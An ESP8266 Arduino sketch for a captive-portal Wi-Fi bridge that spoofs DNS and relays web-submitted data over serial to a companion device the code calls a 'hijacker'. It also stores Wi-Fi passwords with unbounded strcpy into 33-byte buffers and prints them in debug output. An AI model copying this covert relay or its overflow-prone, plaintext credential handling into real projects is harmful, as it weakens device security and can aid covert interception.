/* 
    ESP8266 WiFi Captive Portal
    https://github.com/adamff1/ESP8266-Captive-Portal

    Cyclenerd/AccessPoint.ino
    https://gist.github.com/Cyclenerd/7c9cba13360ec1ec9d2ea36e50c7ff77
*/

#define RESET_EEPROM_PIN 4

bool isDEBUG = true;



#include <list>

#include <EEPROM.h>
#define EEPROM_ADDR_IS_SCHEDULED_RESET  0
#define EEPROM_ADDR_SAVED_WIFI_NET_LIST 80

#include "res_utility.h"



#include <ESP8266TimerInterrupt.h>  // https://github.com/khoih-prog/ESP8266TimerInterrupt
ESP8266Timer TimerInterrupt;

#include <ESP8266WiFi.h>
#include <lwip/napt.h>
#include <lwip/dns.h>
#include <DNSServer.h>
DNSServer dnsServer;

#include <ESP8266LLMNR.h>
#define LLMNR_URL "hijacker"

namespace WIFI_CONNECTOR
{
    volatile bool isConnected = false;
    String nowIP = "";

    #define SAVED_WIFI_NET_MAX_COUNT 10
    struct WIFI_NET
    {
        char id[33]; // MAX 32 letters + NULL
        char pw[33]; // MAX 32 letters + NULL

        WIFI_NET(){}
        WIFI_NET(String apName, String apPw)
        {
            strcpy(this->id, apName.c_str());
            strcpy(this->pw, apPw.c_str());
        }
    };
    std::list<WIFI_NET> SAVED_WIFI_NET_LIST;

    std::list<String> scanWifiNetList()
    {
        struct SCANNED_WIFI_NET {
            String ssid;
            int32_t rssi;
            
            SCANNED_WIFI_NET(String ssid, int32_t rssi) : ssid(ssid), rssi(rssi) {}
        };

        std::vector<SCANNED_WIFI_NET> scannedWifiNetList;

        int numNet = WiFi.scanNetworks();
        for(int i=0; i<numNet; i++) {
            String ssid = WiFi.SSID(i);
            int32_t rssi = WiFi.RSSI(i);

            // If INVALID
            if (ssid.length() == 0)
                continue;

            // If DUPLICATED
            bool isDuplicated = false;
            for(SCANNED_WIFI_NET net : scannedWifiNetList){
                if (net.ssid.equals(ssid)){ isDuplicated = true; break; }
            }
            if (isDuplicated)
                continue;

            scannedWifiNetList.push_back( SCANNED_WIFI_NET(ssid, rssi) );
        }

        // SORT !
        std::sort   (   scannedWifiNetList.begin(), scannedWifiNetList.end(),
                        [](const SCANNED_WIFI_NET& a, const SCANNED_WIFI_NET& b)
                        {
                            return a.rssi > b.rssi; // ORDER BY DESC
                        }
                    );

        std::list<String> result;
        for(SCANNED_WIFI_NET net : scannedWifiNetList)
            result.push_back( net.ssid );

        return result;
    }

    void saveWifiNetList(String apName, String apPw)
    {
        // If ALREADY EXISTS, FUCK OFF.
        for(WIFI_NET wifi : SAVED_WIFI_NET_LIST)
        {
            if (apName.equals(wifi.id) && apPw.equals(wifi.pw))
            {   if (isDEBUG) Serial.println("ALREADY EXISTS, FUCK OFF"); return;   }
        }


        // DEL a most old WIFI_NET
        SAVED_WIFI_NET_LIST.pop_back();
        // ADD a new WIFI_NET
        SAVED_WIFI_NET_LIST.push_front( WIFI_NET(apName, apPw) );


        cli(); // DISABLE INTERRUPT while using EEPROM
        {
            int addr = EEPROM_ADDR_SAVED_WIFI_NET_LIST;

            for(WIFI_NET wifi : SAVED_WIFI_NET_LIST) {
                EEPROM.put(addr, wifi);

                addr += sizeof(WIFI_NET);
            }

            if (EEPROM.commit())
                if (isDEBUG) Serial.print("SAVE......... COMPLETE!");
            else
                if (isDEBUG) Serial.println("SAVE......... ERROR!?");
        }
        sei();
    }

    void loadSavedWifiNetList()
    {
        cli();
        // DISABLE INTERRUPT while using EEPROM
        {
            int addr = EEPROM_ADDR_SAVED_WIFI_NET_LIST;
            WIFI_NET wifi;

            for(int i = 0; i < SAVED_WIFI_NET_MAX_COUNT; i++) {
                EEPROM.get(addr, wifi);
                SAVED_WIFI_NET_LIST.push_back(wifi);

                addr += sizeof(WIFI_NET);
            }
        }
        sei();
    }
}



#include <ESP8266WebServer.h>
ESP8266WebServer webServer(80);

auto getArgByNameFromClient = [](String argName) -> String
{
    for(uint8_t i=0; i<webServer.args(); i++)
        if (webServer.argName(i).equals(argName))
            return webServer.arg(i);

    return "";
};

#include <ArduinoJson.h>

#include "res_INDEX_html.h"
#include "res_SELECT_WIFI_html.h"
#include "res_DARK_PAGE_html.h"

#include "DarkJunction.h"

volatile bool isScheduled = false;
std::function<void(void)> scheduledCallback = nullptr;

void SCHEDULE_FUNCTION(std::function<void(void)> callback)
{
    if (isScheduled) // block duplicated schedule
        return;


    scheduledCallback = callback;
    isScheduled = true;
}

void RUN_SCHEDULED_FUNCTION_FOR_REQUEST()
{
    if (!isScheduled || scheduledCallback==nullptr)
        return;


    scheduledCallback();
    scheduledCallback = nullptr;
    isScheduled = false;
}

#define isAcceptedPush_NOW_PROCESSING   0
#define isAcceptedPush_ACCEPTED         1
#define isAcceptedPush_DENIED           -74

volatile int isAcceptedPush = 0;
void enablePush     (void) { isAcceptedPush = isAcceptedPush_ACCEPTED; }
void disablePush    (void) { isAcceptedPush = isAcceptedPush_NOW_PROCESSING; }
void shutdownPush   (void) { isAcceptedPush = isAcceptedPush_DENIED; }



void setup()
{
    // LED
    pinMode(LED_BUILTIN, OUTPUT); digitalWrite(LED_BUILTIN, HIGH);
    // TO_HIJACKER
    DECLARE_DARKJUNCTION_PINS();


    // EEPROM begin, if RESET_EEPROM_PIN grounded, reset EEPROM
    {
        EEPROM.begin(4096);

        // EEPROM.put(EEPROM_ADDR_IS_SCHEDULED_RESET, false);
        // EEPROM.commit();

        bool isScheduledResetEEPROM = false;
        EEPROM.get(EEPROM_ADDR_IS_SCHEDULED_RESET, isScheduledResetEEPROM);

        pinMode(RESET_EEPROM_PIN, INPUT_PULLUP);
        for(uint8_t i=0; (digitalRead(RESET_EEPROM_PIN)==LOW && isScheduledResetEEPROM==false); i++) {
            delay(1);

            if (i==100) { // LOW state was maintained for 100ms
                isScheduledResetEEPROM = true;
                break;
            }
        }

        if (isScheduledResetEEPROM) {
            for(int i=0;i<4096;i++)
                EEPROM.write(i,0);

            EEPROM.commit();
        }
    }


    // To HIJACKER, wake me up when you need me...
    {
        if (DarkJunction::detectHIGHForXXms(1111))
        {   digitalWrite(LED_BUILTIN, LOW);   }
        else
        {   digitalWrite(LED_BUILTIN, HIGH); ESP.deepSleep(0); return;   }
    }


    // Serial begin, if Debugging
    #if DarkJunction_IS_DEBUG_MODE == 0
        isDEBUG = false;
    #endif
    if (isDEBUG)
    {
        Serial.begin(115200);
        delay(999);
        
        if (!Serial) { isDEBUG = false; Serial.end(); }
    }
    if (isDEBUG) Serial.println(F("\nSERIAL IS ONLINE\n"));


    // Try to CONNECT WIFI (from SAVED_WIFI_NET_LIST)
    {
        WIFI_CONNECTOR::loadSavedWifiNetList();

        // SERIAL scan test
        // if (isDEBUG)
        // {
        //     int i=0;
        //     for(auto wifi : WIFI_CONNECTOR::SAVED_WIFI_NET_LIST)
        //     {
        //         Serial.print("Wifi "); Serial.print(i++); Serial.print(" : ");
        //         Serial.print(wifi.id); Serial.print(" / "); Serial.println(wifi.pw);
        //     }
        // }

        for(String ssid : WIFI_CONNECTOR::scanWifiNetList())
        {
            if (ssid.length() == 0)
                continue;


            // INITIALIZE FOR "/connectToAP"
            strWiFiList += "<li><a>";
            strWiFiList += ssid;
            strWiFiList += "</a></li>";


            if (!WIFI_CONNECTOR::isConnected)
                for(WIFI_CONNECTOR::WIFI_NET wifi : WIFI_CONNECTOR::SAVED_WIFI_NET_LIST)
                {
                    if (ssid.equals(wifi.id))
                    {
                        // Try to CONNECT TO NET !
                        WiFi.begin(wifi.id, wifi.pw);
                        if (isDEBUG) Serial.println( "\nTry to connect to. [ " + String(wifi.id) + " / " + String(wifi.pw) + " ]" );

                        // Up to 10 seconds...
                        int i=0;
                        while (WiFi.status() != WL_CONNECTED) { if (isDEBUG) Serial.print("."); delay(200); if (i++ > 30) break; }

                        // CONNECT SUCCEX !
                        if (WiFi.status() == WL_CONNECTED)
                        {
                            WIFI_CONNECTOR::isConnected = true;
                            WIFI_CONNECTOR::nowIP = WiFi.localIP().toString();

                            if (isDEBUG)
                            {
                                Serial.println(" SUCCEX!!");
                                Serial.print("Now Wifi Connected with IP Address : ");
                                Serial.println(WIFI_CONNECTOR::nowIP);
                                Serial.println();
                            }

                            break;
                        }
                        // CONNECT DENIED..
                        else
                        {
                            if (isDEBUG) Serial.println(" TIMEOUT..\n");
                        }
                    }
                }
        }
    }


    // Set AP MODE
    {
        // if WIFI is Connected, Activate mDNS(LLMNR)
        if (WIFI_CONNECTOR::isConnected)
        {
            // SET WIFI
            WiFi.mode(WIFI_AP_STA);
            WiFi.softAPConfig( IPAddress(192, 168, 69, 1), IPAddress(192, 168, 69, 1), IPAddress(255, 255, 255, 0) );
            WiFi.softAPDhcpServer().setDns( WiFi.dnsIP(0) );
            WiFi.softAP( F("I AM WIFI") );

            // Start LLMNR responder
            LLMNR.begin(LLMNR_URL);
        }
        // if WIFI is not Connected, Startup DNSServer for spoofing
        else
        {
            IPAddress APIP(192, 0, 0, 1); // It doubles as GATEWAY
            byte DNS_PORT = 53;

            // SET WIFI
            WiFi.mode(WIFI_AP);
            WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
            WiFi.softAP( F("I AM NOT WIFI") );

            // if DNSServer is started with "*" for domain name,
            // it will reply with provided IP to all DNS request
            // = DNS spoofing (Only for HTTP)
            dnsServer.start(DNS_PORT, "*", APIP);
        }

        // WiFi INFO will not persist after reboot
        // it works MANUALLY by "WIFI_CONNECTOR"
        WiFi.persistent(false);

        // NAPT allows multiple devices in a private network to share a single public IP
        #define NAPT 1000
        #define NAPT_PORT 10
        err_t ret = ip_napt_init(NAPT, NAPT_PORT);
        if (ret == ERR_OK) { ret = ip_napt_enable_no(SOFTAP_IF, 1); }
    }


    // Set WEB SERVER
    {
        #define HTTP_CODE_OK        200
        #define HTTP_CODE_REDIRECT  302 // found redirect


        webServer.on        (   "/",
                                []
                                {
                                    // redirect to "/DarkJunction/home"
                                    webServer.sendHeader("Location", "/DarkJunction/home", true);
                                    webServer.send(HTTP_CODE_REDIRECT, "text/plain", "");
                                }
                            );


        webServer.on        (   "/rescanWifiNetList",
                                HTTP_POST,
                                []
                                {
                                    webServer.send(HTTP_CODE_OK, "application/json", "null");


                                    SCHEDULE_FUNCTION   (
                                                            [&]() -> void
                                                            {
                                                                strWiFiList = "";

                                                                for(String ssid : WIFI_CONNECTOR::scanWifiNetList())
                                                                {
                                                                    if (ssid.length() == 0) // valid check
                                                                        continue;

                                                                    strWiFiList += "<li><a>";
                                                                    strWiFiList += ssid;
                                                                    strWiFiList += "</a></li>";
                                                                }
                                                            }
                                                        );
                                }
                            );
        webServer.on        (   "/connectToAP",
                                HTTP_GET,
                                []
                                {
                                    if (WIFI_CONNECTOR::isConnected)
                                    {
                                        webServer.sendHeader("Location", "/isConnected", true);
                                        webServer.send(HTTP_CODE_REDIRECT, "text/plain", "");
                                    }
                                    else
                                    {
                                        String htmlDynamic = String(raw_html_SELECT_WIFI);
                                        htmlDynamic.replace("#{strWiFiList}", strWiFiList); // INSERT encoded strWiFiList
                                        webServer.send(HTTP_CODE_OK, "text/html", htmlDynamic);
                                    }
                                }
                            );
        webServer.on        (   "/connectToAP",
                                HTTP_POST,
                                []
                                {
                                    static String apName = "";
                                    static String apPw = "";
                                    {
                                        std::unique_ptr<StaticJsonDocument<100>> JSONData(new StaticJsonDocument<100>);
                                        if (!deserializeJson((*JSONData), webServer.arg("plain"))) {
                                            apName = ((*JSONData).containsKey("apName")) ? String((*JSONData)["apName"].as<String>()) : "";
                                            apPw = ((*JSONData).containsKey("apPw")) ? String((*JSONData)["apPw"].as<String>()) : "";
                                        }
                                    }


                                    webServer.send(HTTP_CODE_OK, "application/json", "null");


                                    SCHEDULE_FUNCTION   (
                                                            [&]() -> void
                                                            {
                                                                // CONNECT TO NET !
                                                                WiFi.begin(apName, apPw);

                                                                // Up to 10 seconds...
                                                                int i=0;
                                                                while (WiFi.status() != WL_CONNECTED) { delay(200); if (i++ > 30) break; }

                                                                // if CONNECTED
                                                                if (WiFi.status() == WL_CONNECTED) {
                                                                    WIFI_CONNECTOR::isConnected = true;
                                                                    WIFI_CONNECTOR::nowIP = WiFi.localIP().toString();

                                                                    WIFI_CONNECTOR::saveWifiNetList(apName, apPw);
                                                                }
                                                            }
                                                        );
                                }
                            );
        webServer.on        (   "/isConnected",
                                HTTP_GET,
                                []
                                {
                                    String param_apName = getArgByNameFromClient("apName");

                                    if (isDEBUG)
                                    {
                                        Serial.println("param_apName::::::::::::::::::");
                                        Serial.println(param_apName);
                                        Serial.println("isConnected::::::::::::::::::");
                                        Serial.println((WIFI_CONNECTOR::isConnected) ? "true" : "false");
                                    }

                                    if (WIFI_CONNECTOR::isConnected)
                                    {
                                        String htmlDynamic = String(raw_html_INDEX);
                                        htmlDynamic.replace("${content}", "Now Connected.<br/>Assigned IP : " + WIFI_CONNECTOR::nowIP); // INSERT encoded strWiFiList
                                        webServer.send(HTTP_CODE_OK, "text/html", htmlDynamic);

                                        SCHEDULE_FUNCTION   (
                                                                []() -> void
                                                                {
                                                                    delay(4321);
                                                                    dnsServer.stop();
                                                                    ESP.restart();
                                                                }
                                                            );
                                    }
                                    else
                                    {
                                        // redirect "/connectToAP" with param_apName
                                        webServer.sendHeader("Location", "/connectToAP?apName=" + param_apName, true);
                                        webServer.send(HTTP_CODE_REDIRECT, "text/plain", "");
                                    }
                                }
                            );


        webServer.on        (   "/DarkJunction/home",
                                HTTP_GET,
                                []
                                {
                                    webServer.send(HTTP_CODE_OK, "text/html", raw_html_DARK_PAGE);
                                }
                            );
        webServer.on        (   "/DarkJunction/getStyles",
                                HTTP_GET,
                                []
                                {
                                    webServer.send(HTTP_CODE_OK, "text/css", raw_css_DARK_PAGE);
                                }
                            );
        webServer.on        (   "/DarkJunction/getInitializer",
                                HTTP_GET,
                                []
                                {
                                    webServer.send(HTTP_CODE_OK, "text/javascript", raw_js_DARK_PAGE_INITIALIZER);
                                }
                            );
        webServer.on        (   "/DarkJunction/getRunner",
                                HTTP_GET,
                                []
                                {
                                    webServer.send(HTTP_CODE_OK, "text/javascript", raw_js_DARK_PAGE_RUNNER);
                                }
                            );


        webServer.on        (   "/DarkJunction/SEND_REQUEST",
                                HTTP_POST,
                                []
                                {
                                    static String strRequest = "";
                                    {
                                        std::unique_ptr<StaticJsonDocument<100>> JSONData(new StaticJsonDocument<100>);
                                        if (!deserializeJson((*JSONData), webServer.arg("plain")))
                                        {
                                            strRequest = ((*JSONData).containsKey("strRequest")) ? String((*JSONData)["strRequest"].as<String>()) : "";
                                        }
                                    }


                                    JsonDocument doc;
                                    doc["result"] = ("REQUEST : "+strRequest+"\n\n");

                                    String jsonResult = "";
                                    serializeJson(doc, jsonResult);
                                    webServer.send(HTTP_CODE_OK, "application/json", jsonResult);


                                    SCHEDULE_FUNCTION   (
                                                            [&]() -> void
                                                            {
                                                                DarkJunction::writeHIGHForXXms(5);

                                                                bool isSendSuccessful = DarkJunction::S3R14L_upload(&strRequest);
                                                                if (!isSendSuccessful)
                                                                    if (isDEBUG) Serial.println("ERROR!! SEND_REQUEST S3R14L_upload");


                                                                // if PULL REQUEST, retrieve the first of pulling data
                                                                if (isEquals(strRequest.substring(0,4).c_str(), "PULL"))
                                                                {
                                                                    bool isDownloadSuccessful = DarkJunction::S3R14L_download();
                                                                    if (!isDownloadSuccessful)
                                                                        if (isDEBUG) Serial.println("ERROR!! SEND_REQUEST S3R14L_download");
                                                                }

                                                                // if PUSH REQUEST, wait for allow
                                                                if (isEquals(strRequest.substring(0,4).c_str(), "PUSH"))
                                                                {
                                                                    bool isNextRequested = DarkJunction::detectHIGHForXXms(500, true);
                                                                    if (!isNextRequested)
                                                                        if (isDEBUG) Serial.println("ERROR!! SEND_REQUEST detectHIGHForXXms");

                                                                    if (isNextRequested)
                                                                        enablePush();
                                                                    else
                                                                        shutdownPush();
                                                                }


                                                                strRequest = "";
                                                            }
                                                        );


                                    MEASURE_FREE_MEMORY();
                                }
                            );

        webServer.on        (   "/DarkJunction/CONTINUE_PULL",
                                HTTP_POST,
                                []
                                {
                                    JsonDocument doc;
                                    if (DarkJunction::isLeftInMessage())
                                    {
                                        doc["result"] = ""+DarkJunction::getMessage();

                                        if (!isContains(DarkJunction::getMessage(),"7R4N5M15510N_C0MPL373D") && !isContains(DarkJunction::getMessage(),"3RR0R3D"))
                                            SCHEDULE_FUNCTION   (
                                                                    [&]() -> void
                                                                    {
                                                                        DarkJunction::writeHIGHForXXms(5);

                                                                        bool isDownloadSuccessful = DarkJunction::S3R14L_download();
                                                                        if (!isDownloadSuccessful)
                                                                            if (isDEBUG) Serial.println("ERROR!! CONTINUE_PULL S3R14L_download");
                                                                    }
                                                                );

                                        DarkJunction::clearMessage();
                                    }
                                    else
                                        doc["result"] = "3RR0R3D";

                                    String jsonResult = "";
                                    serializeJson(doc, jsonResult);
                                    webServer.send(HTTP_CODE_OK, "application/json", jsonResult);


                                    MEASURE_FREE_MEMORY();
                                }
                            );

        webServer.on        (   "/DarkJunction/IS_PUSHABLE",
                                HTTP_POST,
                                []
                                {
                                    JsonDocument doc;
                                    doc["result"] = isAcceptedPush;

                                    String jsonResult = "";
                                    serializeJson(doc, jsonResult);
                                    webServer.send(HTTP_CODE_OK, "application/json", jsonResult);
                                }
                            );

        webServer.on        (   "/DarkJunction/CONTINUE_PUSH",
                                HTTP_POST,
                                []
                                {
                                    if (isAcceptedPush != isAcceptedPush_ACCEPTED)
                                        return;


                                    disablePush();


                                    webServer.send(HTTP_CODE_OK, "application/json", "null");


                                    static String strPushData = "";
                                    {
                                        std::unique_ptr<StaticJsonDocument< 512 >> JSONData(new StaticJsonDocument< 512 >);
                                        if (!deserializeJson((*JSONData), webServer.arg("plain")))
                                        {
                                            strPushData = ((*JSONData).containsKey("strPushData")) ? String((*JSONData)["strPushData"].as<String>()) : "";
                                        }
                                    }


                                    SCHEDULE_FUNCTION   (
                                                            [&]() -> void
                                                            {
                                                                bool isSendSuccessful = DarkJunction::S3R14L_upload(&strPushData);
                                                                if (!isSendSuccessful)
                                                                    if (isDEBUG) Serial.println("ERROR!! CONTINUE_PUSH S3R14L_upload");


                                                                if (!isContains(strPushData,"7R4N5M15510N_C0MPL373D"))
                                                                {
                                                                    bool isNextRequested = DarkJunction::detectHIGHForXXms(500, true);
                                                                    if (!isNextRequested)
                                                                        if (isDEBUG) Serial.println("ERROR!! CONTINUE_PUSH detectHIGHForXXms");


                                                                    if (isNextRequested)
                                                                        enablePush();
                                                                    else
                                                                        shutdownPush();
                                                                }


                                                                strPushData = "";
                                                            }
                                                        );


                                    MEASURE_FREE_MEMORY();
                                }
                            );


        webServer.onNotFound(   []
                                {
                                    String htmlDynamic = String(raw_html_SELECT_WIFI);
                                    htmlDynamic.replace("#{strWiFiList}", strWiFiList); // INSERT encoded strWiFiList
                                    webServer.send(HTTP_CODE_OK, "text/html", htmlDynamic);
                                }
                            );
        webServer.begin();
    }


    // TimerInterrupt controls LED
    TimerInterrupt.attachInterruptInterval  (   1000,
                                                []
                                                {
                                                    static bool stateLED = false;

                                                    //per1ms!
                                                    {
                                                    }

                                                    //per ?ms
                                                    if ( !(millis() % 10000) )
                                                    {
                                                        MEASURE_FREE_MEMORY();
                                                    }

                                                    //per 1500ms or 150ms
                                                    if ( !(millis() % (WIFI_CONNECTOR::isConnected ? 1500 : 150)) )
                                                    {
                                                        digitalWrite(LED_BUILTIN, stateLED^=1 ? HIGH : LOW);
                                                    }
                                                }
                                            );


    // To HIJACKER, i'm READY
    if (WIFI_CONNECTOR::isConnected)
    {
        DarkJunction::writeHIGHForXXms(50); // REPORT i'm READY !

        DarkJunction::BOOT();

        String url;
        url += "http://";
        url += LLMNR_URL;
        url += ".local";
        DarkJunction::S3R14L_upload(&url);
    }


    if (isDEBUG){ MEASURE_FREE_MEMORY(); Serial.println(F("WIFI_ACCOMPLICE ALL READY, SIR!\n\n\n\n")); }
}



void loop()
{
    if (!WIFI_CONNECTOR::isConnected)
        dnsServer.processNextRequest();

    webServer.handleClient();


    RUN_SCHEDULED_FUNCTION_FOR_REQUEST();
}
